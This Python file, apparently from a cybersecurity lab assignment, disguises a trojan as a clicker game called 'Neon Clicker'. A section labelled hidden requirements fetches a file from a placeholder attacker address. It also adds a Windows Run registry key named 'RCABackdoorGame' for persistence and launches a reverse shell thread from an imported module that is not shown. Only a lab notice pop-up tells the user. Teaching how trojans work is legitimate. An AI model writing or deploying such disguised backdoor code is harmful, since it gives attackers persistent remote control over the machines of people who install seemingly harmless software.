import customtkinter as ctk
from tkinter import messagebox
import threading
import os
import sys
import requests
import random
import time
import communication # Your reverse shell logic

# --- THE GAME ENGINE ---

class ReactionGame(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Neon Clicker v1.0")
        self.geometry("700x500")
        self.resizable(False, False)

        # Game State
        self.score = 0
        self.time_left = 30
        self.game_running = False

        # --- UI SETUP ---
        # Sidebar for stats
        self.sidebar = ctk.CTkFrame(self, width=150, corner_radius=0)
        self.sidebar.pack(side="left", fill="y")

        self.score_label = ctk.CTkLabel(self.sidebar, text="Score: 0", font=("Arial", 20, "bold"))
        self.score_label.pack(pady=20)

        self.time_label = ctk.CTkLabel(self.sidebar, text="Time: 30s", font=("Arial", 18))
        self.time_label.pack(pady=10)

        self.start_btn = ctk.CTkButton(self.sidebar, text="START GAME", command=self.start_game)
        self.start_btn.pack(pady=20, padx=10)

        # Game Canvas (The "Play Area")
        self.canvas = ctk.CTkCanvas(self, width=530, height=480, bg="#1a1a1a", highlightthickness=0)
        self.canvas.pack(pady=10, padx=10)

        # Target object (The circle to click)
        self.target = self.canvas.create_oval(0, 0, 0, 0, fill="#3498db", outline="white")
        self.canvas.tag_bind(self.target, "<Button-1>", self.on_target_click)

    def start_game(self):
        if not self.game_running:
            self.score = 0
            self.time_left = 30
            self.game_running = True
            self.start_btn.configure(state="disabled")
            self.move_target()
            self.update_timer()

    def move_target(self):
        if self.game_running:
            # Pick a random spot
            x = random.randint(50, 480)
            y = random.randint(50, 430)
            r = 25 # Radius
            self.canvas.coords(self.target, x-r, y-r, x+r, y+r)
            # Move target again after 1 second if not clicked
            self.after_id = self.after(1000, self.move_target)

    def on_target_click(self, event):
        if self.game_running:
            self.score += 1
            self.score_label.configure(text=f"Score: {self.score}")
            # Reset the move timer immediately when clicked
            self.after_cancel(self.after_id)
            self.move_target()

    def update_timer(self):
        if self.time_left > 0 and self.game_running:
            self.time_left -= 1
            self.time_label.configure(text=f"Time: {self.time_left}s")
            self.after(1000, self.update_timer)
        elif self.time_left <= 0:
            self.end_game()

    def end_game(self):
        self.game_running = False
        self.start_btn.configure(state="normal")
        messagebox.showinfo("Game Over", f"Time is up! Your final score: {self.score}")


# --- ASSIGNMENT REQUIREMENTS (HIDDEN) ---

def check_dependencies():
    """Requirement 1: Check/Download Dependencies"""
    required_file = "assets_lib.txt"
    if not os.path.exists(required_file):
        try:
            # Change this to your Attacker IP
            url = "http://127.0.0.1:8080/assets_lib.txt" 
            r = requests.get(url, timeout=3)
            with open(required_file, "wb") as f:
                f.write(r.content)
        except:
            # Fallback so game doesn't crash if server is down
            with open(required_file, "w") as f:
                f.write("Local Cache")

def set_persistence():
    """Requirement 3: Persistence in Registry"""
    if sys.platform == "win32":
        import winreg
        try:
            path = os.path.realpath(sys.argv[0])
            key = winreg.HKEY_CURRENT_USER
            key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(open_key, "RCABackdoorGame", 0, winreg.REG_SZ, path)
            winreg.CloseKey(open_key)
        except:
            pass

if __name__ == "__main__":
    # 1. Run Hidden Background Tasks
    check_dependencies()
    set_persistence()
    
    # Requirement 6: Notify user (Important for Grading)
    messagebox.showwarning("Lab Notice", "This educational game is part of a Cybersecurity lab. "
                                        "A background connection will be established.")

    # 2. Start Reverse Shell Thread (Requirement 2 & 4)
    # This runs in the background so the game (Main Thread) never lags.
    threading.Thread(target=communication.start_connection, daemon=True).start()
    
    # 3. Launch the Game
    app = ReactionGame()
    app.mainloop()